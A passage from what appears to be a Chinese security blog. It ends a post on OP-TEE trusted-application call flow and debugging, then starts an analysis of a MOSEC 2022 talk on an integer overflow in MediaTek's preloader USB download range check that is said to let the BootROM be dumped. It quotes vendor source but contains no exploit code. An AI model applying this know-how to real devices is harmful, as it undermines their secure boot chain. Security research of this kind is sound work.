<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20221112204331216.png" alt="image-20221112204331216"></p>
<p>这个handler里会保存 non-secure的上下文，恢复secure的上下文，然后直接eret到TEE侧。</p>
<p>进入optee之后来到:</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20221112204354659.png" alt="image-20221112204354659"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">53</span>  <span class="function"><span class="keyword">uint32_t</span> <span class="title">thread_handle_std_smc</span><span class="params">(<span class="keyword">uint32_t</span> a0, <span class="keyword">uint32_t</span> a1, <span class="keyword">uint32_t</span> a2,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="number">54</span>                     <span class="keyword">uint32_t</span> a3, <span class="keyword">uint32_t</span> a4, <span class="keyword">uint32_t</span> a5,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="number">55</span>                     <span class="keyword">uint32_t</span> a6 __unused, <span class="keyword">uint32_t</span> a7 __maybe_unused)</span></span></span><br><span class="line"><span class="function">56  </span>&#123;</span><br><span class="line">            ....</span><br><span class="line"></span><br><span class="line"><span class="number">69</span>      <span class="keyword">if</span> (a0 == OPTEE_SMC_CALL_RETURN_FROM_RPC) &#123;</span><br><span class="line"><span class="number">70</span>          thread_resume_from_rpc(a3, a1, a2, a4, a5);</span><br><span class="line"><span class="number">71</span>          rv = OPTEE_SMC_RETURN_ERESUME;</span><br><span class="line"><span class="number">72</span>      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="number">73</span>          thread_alloc_and_run(a0, a1, a2, a3, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"><span class="number">74</span>          rv = OPTEE_SMC_RETURN_ETHREAD_LIMIT;</span><br><span class="line"><span class="number">75</span>      &#125;</span><br><span class="line"></span><br><span class="line">            ...</span><br></pre></td></tr></table></figure>

<p>第一次走到 thread_alloc_and_run，传入参数是 <code>thread_std_smc_entry</code>， 所以会执行到 <code>thread_std_smc_entry</code></p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20221112204452280.png" alt="image-20221112204452280"></p>
<p>后续的流程 : </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__thread_std_smc_entry</span></span><br><span class="line"><span class="function">    <span class="title">std_smc_entry</span><span class="params">(a0, a1, a2, a3)</span></span>;</span><br><span class="line">        std_entry_with_parg(...)</span><br><span class="line">            call_entry_std</span><br><span class="line">            tee_entry_std</span><br><span class="line">            __tee_entry_std</span><br></pre></td></tr></table></figure>

<p>至此，到了关键的逻辑:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">538</span>  TEE_Result __tee_entry_std(struct optee_msg_arg *arg, <span class="keyword">uint32_t</span> num_params)</span><br><span class="line"><span class="number">539</span>  &#123;</span><br><span class="line"><span class="number">540</span>      TEE_Result res = TEE_SUCCESS;</span><br><span class="line"><span class="number">541</span>  </span><br><span class="line"><span class="number">542</span>      <span class="comment">/* Enable foreign interrupts for STD calls */</span></span><br><span class="line"><span class="number">543</span>      thread_set_foreign_intr(<span class="literal">true</span>);</span><br><span class="line"><span class="number">544</span>      <span class="keyword">switch</span> (arg-&gt;cmd) &#123;</span><br><span class="line"><span class="number">545</span>      <span class="keyword">case</span> OPTEE_MSG_CMD_OPEN_SESSION:</span><br><span class="line"><span class="number">546</span>          entry_open_session(arg, num_params);</span><br><span class="line"><span class="number">547</span>          <span class="keyword">break</span>;</span><br><span class="line"><span class="number">548</span>      <span class="keyword">case</span> OPTEE_MSG_CMD_CLOSE_SESSION:</span><br><span class="line"><span class="number">549</span>          entry_close_session(arg, num_params);</span><br><span class="line"><span class="number">550</span>          <span class="keyword">break</span>;</span><br><span class="line"><span class="number">551</span>      <span class="keyword">case</span> OPTEE_MSG_CMD_INVOKE_COMMAND:</span><br><span class="line"><span class="number">552</span>          entry_invoke_command(arg, num_params);</span><br><span class="line"><span class="number">553</span>          <span class="keyword">break</span>;</span><br><span class="line"><span class="number">554</span>      <span class="keyword">case</span> OPTEE_MSG_CMD_CANCEL:</span><br><span class="line"><span class="number">555</span>          entry_cancel(arg, num_params);</span><br><span class="line"><span class="number">556</span>          <span class="keyword">break</span>;</span><br><span class="line"><span class="number">557</span>  <span class="meta">#<span class="meta-keyword">ifndef</span> CFG_CORE_FFA</span></span><br><span class="line"><span class="number">558</span>  <span class="meta">#<span class="meta-keyword">ifdef</span> CFG_CORE_DYN_SHM</span></span><br><span class="line"><span class="number">559</span>      <span class="keyword">case</span> OPTEE_MSG_CMD_REGISTER_SHM:</span><br><span class="line"><span class="number">560</span>          register_shm(arg, num_params);</span><br><span class="line"><span class="number">561</span>          <span class="keyword">break</span>;</span><br><span class="line"><span class="number">562</span>      <span class="keyword">case</span> OPTEE_MSG_CMD_UNREGISTER_SHM:</span><br><span class="line"><span class="number">563</span>          unregister_shm(arg, num_params);</span><br><span class="line"><span class="number">564</span>          <span class="keyword">break</span>;</span><br><span class="line"><span class="number">565</span>  <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="number">566</span>  <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="number">567</span>  </span><br><span class="line"><span class="number">568</span>      <span class="keyword">case</span> OPTEE_MSG_CMD_DO_BOTTOM_HALF:</span><br><span class="line"><span class="number">569</span>          <span class="keyword">if</span> (IS_ENABLED(CFG_CORE_ASYNC_NOTIF))</span><br><span class="line"><span class="number">570</span>              notif_deliver_event(NOTIF_EVENT_DO_BOTTOM_HALF);</span><br><span class="line"><span class="number">571</span>          <span class="keyword">else</span></span><br><span class="line"><span class="number">572</span>              <span class="keyword">goto</span> err;</span><br><span class="line"><span class="number">573</span>          <span class="keyword">break</span>;</span><br><span class="line"><span class="number">574</span>      <span class="keyword">case</span> OPTEE_MSG_CMD_STOP_ASYNC_NOTIF:</span><br><span class="line"><span class="number">575</span>          <span class="keyword">if</span> (IS_ENABLED(CFG_CORE_ASYNC_NOTIF))</span><br><span class="line"><span class="number">576</span>              notif_deliver_event(NOTIF_EVENT_STOPPED);</span><br><span class="line"><span class="number">577</span>          <span class="keyword">else</span></span><br><span class="line"><span class="number">578</span>              <span class="keyword">goto</span> err;</span><br><span class="line"><span class="number">579</span>          <span class="keyword">break</span>;</span><br><span class="line"><span class="number">580</span>  </span><br><span class="line"><span class="number">581</span>      <span class="keyword">default</span>:</span><br><span class="line"><span class="number">582</span>  err:</span><br><span class="line"><span class="number">583</span>          EMSG(<span class="string">&quot;Unknown cmd 0x%x&quot;</span>, arg-&gt;cmd);</span><br><span class="line"><span class="number">584</span>          res = TEE_ERROR_NOT_IMPLEMENTED;</span><br><span class="line"><span class="number">585</span>      &#125;</span><br><span class="line"><span class="number">586</span>  </span><br><span class="line"><span class="number">587</span>      <span class="keyword">return</span> res;</span><br><span class="line"><span class="number">588</span>  &#125;</span><br></pre></td></tr></table></figure>

<p>这次的cmd是 open session所以走 <code>entry_open_session</code>函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">373</span>     res = tee_ta_open_session(&amp;err_orig, &amp;s, &amp;tee_open_sessions, &amp;uuid,</span><br><span class="line"><span class="number">374</span>                   &amp;clnt_id, TEE_TIMEOUT_INFINITE, &amp;param);</span><br><span class="line"></span><br><span class="line"><span class="comment">// uuid，需要根据uuid来加载TA了</span></span><br></pre></td></tr></table></figure>

<p>然后去加载对应的TA，在 tee_ta_open_session // tee_ta_manager.c</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">715</span>     res = tee_ta_init_session(err, open_sessions, uuid, &amp;s);</span><br></pre></td></tr></table></figure>

<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20221112204603153.png" alt="image-20221112204603153"></p>
<p>加载完毕之后，如果成功加载了，那就调用 <code>ts_ctx-&gt;ops-&gt;enter_open_session(&amp;s-&gt;ts_sess);</code></p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20221112204739124.png" alt="image-20221112204739124"></p>
<p>根据注册信息，应该是 <code>user_ta_enter_open_session</code></p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20221112204803734.png" alt="image-20221112204803734"></p>
<p>调用到 user_ta_enter  函数，此时还是在optee里的，需要跳到TA去执行</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">166</span>      res = thread_enter_user_mode(func, kaddr_to_uref(session),</span><br><span class="line"><span class="number">167</span>                       (<span class="keyword">vaddr_t</span>)usr_params, cmd, usr_stack,</span><br><span class="line"><span class="number">168</span>                       utc-&gt;uctx.entry_func, utc-&gt;uctx.is_32bit,</span><br><span class="line"><span class="number">169</span>                       &amp;utc-&gt;ta_ctx.panicked,</span><br><span class="line"><span class="number">170</span>                       &amp;utc-&gt;ta_ctx.panic_code);</span><br></pre></td></tr></table></figure>

<p>S-EL1 → S-EL0，应该是eret过去的</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__thread_enter_user_mode(regs, exit_status0, exit_status1);</span><br><span class="line">    b eret_to_el0</span><br><span class="line">        eret </span><br></pre></td></tr></table></figure>

<p>跳转前设置好了上下文，所以eret后就回到了TA中执行，这就到了TA中的 <code>TA_OpenSessionEntryPoint</code></p>
<h3 id="TEEC-InvokeCommand"><a href="#TEEC-InvokeCommand" class="headerlink" title="TEEC_InvokeCommand"></a>TEEC_InvokeCommand</h3><p>逻辑基本和上面OpenSession差不多，差别就在于传递的 <code>InvokeCommand</code></p>
<p>所以最后是走到</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">user_ta_enter_invoke_cmd</span></span><br><span class="line"><span class="function">    <span class="title">user_ta_enter</span><span class="params">(s, UTEE_ENTRY_FUNC_INVOKE_COMMAND, cmd)</span></span>;</span><br></pre></td></tr></table></figure>

<p>然后调用到TA的 <strong><code>TEEC_InvokeCommand</code> 函数</strong></p>
<h3 id="TEEC-CloseSession"><a href="#TEEC-CloseSession" class="headerlink" title="TEEC_CloseSession"></a>TEEC_CloseSession</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">TEEC_CloseSession</span><span class="params">(TEEC_Session *session)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">tee_ioctl_close_session_arg</span> <span class="title">arg</span>;</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">memset</span>(&amp;arg, <span class="number">0</span>, <span class="keyword">sizeof</span>(arg));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!session)</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">        arg.session = session-&gt;session_id;</span><br><span class="line">        <span class="keyword">if</span> (ioctl(session-&gt;ctx-&gt;fd, TEE_IOC_CLOSE_SESSION, &amp;arg))</span><br><span class="line">                EMSG(<span class="string">&quot;Failed to close session 0x%x&quot;</span>, session-&gt;session_id);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>也是类似的情况，调用到内核里tee_ioctl_close_session ，区别只是cmd不同，最后会一路到TA侧的 TA_CloseSessionEntryPoint</p>
<h3 id="TEEC-FinalizeContext"><a href="#TEEC-FinalizeContext" class="headerlink" title="TEEC_FinalizeContext"></a>TEEC_FinalizeContext</h3><p>关闭打开的驱动</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">TEEC_FinalizeContext</span><span class="params">(TEEC_Context *ctx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (ctx)</span><br><span class="line">                close(ctx-&gt;fd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><p>根据上面的流程梳理，只要在optee 往TA里跳的时候下个断，就能去分析TA了，然后再加载TA的符号就能快乐地debug了，没有源码那就纯黑盒调试TA了</p>
<p>结合<a href="https://github.com/ForgeRock/optee-build/blob/master/docs/debug.md#15-debugging-ta">optee的文档</a> 里的描述，会用到TA的 .text段 LMA信息</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">$ objdump -h <span class="number">8</span>aaaf200<span class="number">-2450</span><span class="number">-11e4</span>-abe2<span class="number">-0002</span>a5d5c51b.elf | grep <span class="string">&quot;.text&quot;</span></span><br><span class="line">  <span class="number">1</span> .text         <span class="number">00012e5</span>c  <span class="number">00000020</span>  <span class="number">00000020</span>  <span class="number">00001020</span>  <span class="number">2</span>**<span class="number">2</span></span><br></pre></td></tr></table></figure>

<p>启动ADS，然后在加载tee的时候断住，加载tee的符号，参考<a href="https://o0xmuhe.github.io/2022/08/24/optee%E5%AD%A6%E4%B9%A0/#bl32">我上一篇博客</a>就行了。</p>
<blockquote>
<p>  如果想调试全部的过程，按照文章把 Linux kernel、 bl31 runtime 的符号也加载进来就行了</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b user_ta_enter_open_session</span><br></pre></td></tr></table></figure>

<p>然后执行CA，可以观察到已经断下来了</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20221112205051157.png" alt="image-20221112205051157"></p>
<p>其实这个时候TEE侧log已经看到了TA被加载到了哪里了，直接下断也可以的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b *EL0S:0x40060020</span><br></pre></td></tr></table></figure>

<p>但是没断下来且报错了，很奇怪的是eret之后 还是显示SEL1，我查看了currentel寄存器之后发现确实是在EL0的</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20221112205212578.png" alt="image-20221112205212578"></p>
<p>问了下组里的大佬，这个反汇编窗口显示的<code>ELxS/N</code> 应该是这块内存的属性，而不是当前执行状态 (之前直接靠这个tag来做判断，看来是错的离谱了)</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20221112205228983.png" alt="image-20221112205228983"></p>
<blockquote>
<p>  个人猜测 因为TA加载是optee做的，所以可能optee分配出来的内存就是EL1S，所以跑到TA的时候，反汇编窗口地址tag会显示EL1S</p>
</blockquote>
<p>然后尝试加载符号就行了:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">add-symbol-file /home/muhe/Study/optee-fvp/out-br/build/optee_examples_ext-1.0/hello_world/ta/out/8aaaf200-2450-11e4-abe2-0002a5d5c51b.elf 0x40060020</span><br></pre></td></tr></table></figure>

<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20221112205413157.png" alt="image-20221112205413157"></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><blockquote>
<p><a href="https://blog.csdn.net/weixin_42135087/article/details/119384252">https://blog.csdn.net/weixin_42135087/article/details/119384252</a></p>
<p><a href="https://www.timesys.com/security/trusted-software-development-op-tee/">https://www.timesys.com/security/trusted-software-development-op-tee/</a></p>
<p><a href="https://optee.readthedocs.io/en/latest/building/gits/optee_examples/optee_examples.html">https://optee.readthedocs.io/en/latest/building/gits/optee_examples/optee_examples.html</a></p>
</blockquote>
]]></content>
      <categories>
        <category>optee</category>
      </categories>
      <tags>
        <tag>debug</tag>
        <tag>optee</tag>
      </tags>
  </entry>
  <entry>
    <title>议题学习:MOSEC2022 MediAttack - break the boot chain of MediaTek SoC</title>
    <url>/2022/11/23/%E8%AE%AE%E9%A2%98%E8%A7%A3%E8%AF%BB-MOSEC2022-MediAttack-break-the-boot-chain-of-MediaTek-SoC/</url>
    <content><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>  前段时间MOSEC上盘古关于MTK BootROM Exploit的议题非常精彩，所以我画了一些时间对议题内容进行分析，并结合手边能找到的一些材料做了逆向分析，也感谢同事<a href="https://twitter.com/CossackWang">@C0ss4ck</a>在会场拍下了完整的Slide :) </p>
<span id="more"></span>

<p>配合MOSEC官方的微博食用更佳 :)</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20221130141500497.png" alt="image-20221130141500497"></p>
<h2 id="议题学习"><a href="#议题学习" class="headerlink" title="议题学习"></a>议题学习</h2><h3 id="MTK-Based-Boot-flow"><a href="#MTK-Based-Boot-flow" class="headerlink" title="MTK Based Boot flow"></a>MTK Based Boot flow</h3><p>在进行研究之前需要搞明白MTK方案的设备的冷启动流程，议题中提供的图简洁明了：</p>
<table>
<thead>
<tr>
<th><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20221123141303601.png" alt="image-20221123141303601"></th>
<th><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/mtk_boot.png" alt="boot_flow"></th>
</tr>
</thead>
</table>
<blockquote>
<p>  按照ARM的标准流程preloader应该是bl2</p>
</blockquote>
<p>因为后面使用了preloader的洞把BROM dump出来了，所以我判断MTK的preloader应该是和BROM跑在同一个Exception Level的，即EL3，后来也找了一些资料确认了这个说法，<strong>但是不确定现在最新的SoC还是不是这样的。</strong></p>
<h3 id="Preloader部分"><a href="#Preloader部分" class="headerlink" title="Preloader部分"></a>Preloader部分</h3><p>  出漏洞的模块在preloader的USB Download模式，MTK自定义了一些命令，在这个模式下USB handshake之后可以发送DA，然后加载DA，随后就可以和DA通信读写分区什么的，类似高通的9008(进edl模式后加载FH)，当然如果开启了SecurityBoot，公版的DA无法使用，需要对应签名的DA才可以。</p>
<p>  根据大佬的议题内容可知，漏洞是一个整数溢出，是在判断读/写命令地址范围的时候出现的:</p>
<table>
<thead>
<tr>
<th><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20221123142404496.png" alt="image-20221123142404496"></th>
<th><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20221123142423007.png" alt="image-20221123142423007"></th>
</tr>
</thead>
</table>
<p>因为MTK的方案有很多开发板，所以基线代码基本上都很容易找到，比如使用了MT6737的香橙派-4G-IOT这个开发板(好像停产了，现存的巨贵)，有个大哥把代码放github了</p>
<blockquote>
<p>  <a href="https://github.com/SoCXin/MT6737/tree/master/linux">https://github.com/SoCXin/MT6737/tree/master/linux</a></p>
</blockquote>
<p>根据这份代码，分析这个漏洞其实很简单了</p>
<p><code>/home/muhe/Code/MT6737/linux/bootloader/preloader/platform/mt6735/src/core/download.c</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">usbdl_handler</span><span class="params">(struct bldr_comport *comport, u32 hshk_tmo_ms)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    u8 cmd;</span><br><span class="line">    u32 cnt = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (usbdl_check_start_command(comport, hshk_tmo_ms) == FALSE) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s start cmd handshake timeout (%dms)\n&quot;</span>, MOD, hshk_tmo_ms);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s PASS Tool Sync Seq.\n&quot;</span>, MOD);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* if log is disabled, re-init log port and enable it */</span></span><br><span class="line">    <span class="keyword">if</span> (comport-&gt;type == COM_USB &amp;&amp; log_status() == <span class="number">0</span>) &#123;</span><br><span class="line">        mtk_uart_init(UART_SRC_CLK_FRQ, CFG_LOG_BAUDRATE);</span><br><span class="line">        log_ctrl(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    dlcomport = comport;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        platform_wdt_kick();</span><br><span class="line"></span><br><span class="line">        usbdl_get_byte(&amp;cmd);</span><br><span class="line">        <span class="keyword">if</span> (cmd != CMD_GET_BL_VER)</span><br><span class="line">            usbdl_put_byte(cmd);    <span class="comment">/* echo cmd */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line">        <span class="keyword">case</span> CMD_GET_BL_VER:</span><br><span class="line">        ....</span><br><span class="line">        </span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">     ...</span><br><span class="line">     </span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>支持的命令也很多:</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20221123142910268.png" alt="image-20221123142910268"></p>
<p>直接定位到 <code>static u32 usbdl_read16(bool legacy)</code> </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> u32 <span class="title">usbdl_read16</span><span class="params">(<span class="keyword">bool</span> legacy)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    u32 index;</span><br><span class="line">    u32 base_addr=<span class="number">0</span>;</span><br><span class="line">    u32 len16=<span class="number">0</span>;</span><br><span class="line">    u32 len8=<span class="number">0</span>;</span><br><span class="line">    u16 data=<span class="number">0</span>;</span><br><span class="line">    u32 status=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    usbdl_get_dword(&amp;base_addr); <span class="comment">// [1]获取地址</span></span><br><span class="line">    usbdl_put_dword(base_addr);</span><br><span class="line"></span><br><span class="line">    usbdl_get_dword(&amp;len16);     <span class="comment">// [2] 获取长度</span></span><br><span class="line">    usbdl_put_dword(len16);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* check addr alignment */</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != (base_addr &amp; (<span class="number">2</span><span class="number">-1</span>))) &#123;</span><br><span class="line">        status = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">goto</span> end;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* check len */</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> == len16) &#123;</span><br><span class="line">        status = <span class="number">-2</span>;</span><br><span class="line">        <span class="keyword">goto</span> end;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* convert half-word(2B) length to byte length */</span></span><br><span class="line">    len8 = (len16 &lt;&lt; <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* overflow attack check */</span></span><br><span class="line">    <span class="keyword">if</span> (len16 &gt;= len8) &#123;</span><br><span class="line">        status = <span class="number">-3</span>;</span><br><span class="line">        <span class="keyword">goto</span> end;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* check if addr range is valid */</span></span><br><span class="line">    sec_region_check(base_addr,len8);    <span class="comment">// [3] 安全检查</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!legacy) &#123;</span><br><span class="line">        <span class="comment">/* return status */</span></span><br><span class="line">        usbdl_put_word(status);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (index = <span class="number">0</span>; index &lt; len16; index++) &#123;  <span class="comment">// [4] 执行读操作并返回数据</span></span><br><span class="line">        data = *(u16*)(base_addr + (index &lt;&lt; <span class="number">1</span>));</span><br><span class="line">        usbdl_put_word(data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">end:</span><br><span class="line">    <span class="keyword">if</span>(!legacy) &#123;</span><br><span class="line">        <span class="comment">/* return status */</span></span><br><span class="line">        usbdl_put_word(status);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>核心逻辑还是 <code>sec_region_check(base_addr,len8);  </code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sec_region_check</span> <span class="params">(U32 addr, U32 len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    U32 ret = SEC_OK;</span><br><span class="line">    U32 tmp = addr + len;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* check if it does access AHB/APB register */</span></span><br><span class="line">    <span class="keyword">if</span> ((IO_PHYS != (addr &amp; REGION_MASK)) || (IO_PHYS != (tmp &amp; REGION_MASK))) &#123;</span><br><span class="line">        SMSG(<span class="string">&quot;[%s] 0x%x Not AHB/APB Address\n&quot;</span>, MOD, addr);</span><br><span class="line">        ASSERT(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (len &gt;= REGION_BANK) &#123;</span><br><span class="line">        SMSG(<span class="string">&quot;[%s] Overflow\n&quot;</span>,MOD);</span><br><span class="line">        ASSERT(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (blacklist_check(addr, len)) &#123;</span><br><span class="line">        SMSG(<span class="string">&quot;[%s] Not Allowed\n&quot;</span>, MOD);</span><br><span class="line">        ASSERT(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> MTK_SECURITY_SW_SUPPORT</span></span><br><span class="line">    <span class="comment">/* check platform security region */</span></span><br><span class="line">    <span class="keyword">if</span> (SEC_OK != (ret = seclib_region_check(addr,len))) &#123;</span><br><span class="line">        SMSG(<span class="string">&quot;[%s] ERR &#x27;0x%x&#x27; ADDR: 0x%x, LEN: %d\n&quot;</span>, MOD, ret, addr, len);</span><br><span class="line">        ASSERT(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里执行了两个检查：</p>
<ol>
<li>  判断你要操作的是不是物理外设所在的内存</li>
<li>  判断你要操作的外设是不是在黑名单里，有部分外设不能操作</li>
<li>  这里可能是因为方案不同，大佬PPT里的那个方案是白名单的操作，只允许操作xxx，不过不影响理解。</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">REGION g_blacklist[] = &#123;</span><br><span class="line">    &#123;MSDC0_BASE, <span class="number">0x10000</span>&#125;,</span><br><span class="line">    &#123;MSDC1_BASE, <span class="number">0x10000</span>&#125;,</span><br><span class="line">    &#123;MSDC2_BASE, <span class="number">0x10000</span>&#125;,</span><br><span class="line">    &#123;MSDC3_BASE, <span class="number">0x10000</span>&#125;,</span><br><span class="line">    &#123;NFI_BASE, <span class="number">0x1000</span>&#125;,</span><br><span class="line">    &#123;NFIECC_BASE, <span class="number">0x1000</span>&#125;,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">blacklist_check</span><span class="params">(U32 addr, U32 len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> blacklist_size = <span class="keyword">sizeof</span>(g_blacklist) / <span class="keyword">sizeof</span>(REGION);</span><br><span class="line">    REGION region;</span><br><span class="line">    region.start = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)addr;</span><br><span class="line">    region.size = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)len;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; blacklist_size; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (is_region_overlap(&amp;region, &amp;(g_blacklist[i]))) &#123;</span><br><span class="line">            ret = <span class="number">-1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">is_region_overlap</span><span class="params">(REGION *region1, REGION *region2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> overlap = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (region1-&gt;start + region1-&gt;size &lt;= region2-&gt;start)</span><br><span class="line">        overlap = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (region2-&gt;start + region2-&gt;size &lt;= region1-&gt;start)</span><br><span class="line">        overlap = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        overlap = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> overlap;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20221123143717115.png" alt="image-20221123143717115"></p>
<blockquote>
<p>  这里就要祭出datasheet里的memory map</p>
</blockquote>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20221123143410104.png" alt="image-20221123143410104"></p>
<p>根据memory map，利用这漏洞就可以把BROM dump出来了</p>
